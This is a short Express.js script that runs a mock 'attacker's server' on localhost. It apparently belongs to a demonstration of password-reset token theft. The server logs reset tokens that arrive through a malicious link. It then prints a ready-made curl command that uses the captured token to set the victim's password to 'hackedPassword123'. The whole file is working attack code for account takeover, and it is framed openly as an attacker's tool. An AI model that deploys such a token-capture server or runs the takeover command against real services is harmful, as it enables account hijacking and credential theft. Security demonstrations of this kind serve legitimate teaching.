import express from 'express';

const logger = {
    red: (msg) => console.log(`\x1b[31m[ATTACKER'S SERVER]\x1b[0m ${msg}`),
};

const attackerApp = express();
const ATTACKER_PORT = 9090;

attackerApp.get('/reset-password', (req, res) => {
    const capturedToken = req.query.token;

    console.log(`\n\x1b[31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\x1b[0m`);
    logger.red(`TOKEN CAPTURED: ${capturedToken}`);
    logger.red(`The victim clicked the malicious link!`);
    console.log(`\x1b[31m!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\x1b[0m`);
    
    // Provide the next command to complete the takeover
    console.log(`\n\x1b[1mNext Step: Use this token to change the user's password.\x1b[0m`);
    console.log(`\x1b[90mRun this command in your terminal:\x1b[0m`);
    console.log(`\x1b[33mcurl -X POST http://localhost:3000/reset-password -H "Content-Type: application/json" -d '{"token":"${capturedToken}","newPassword":"hackedPassword123"}'\x1b[0m\n`);

    res.send('<h1>This is the attacker\'s page. Your credentials have been compromised.</h1>');
});

attackerApp.listen(ATTACKER_PORT, () => {
    logger.red(`Listening on http://localhost:${ATTACKER_PORT}`);
});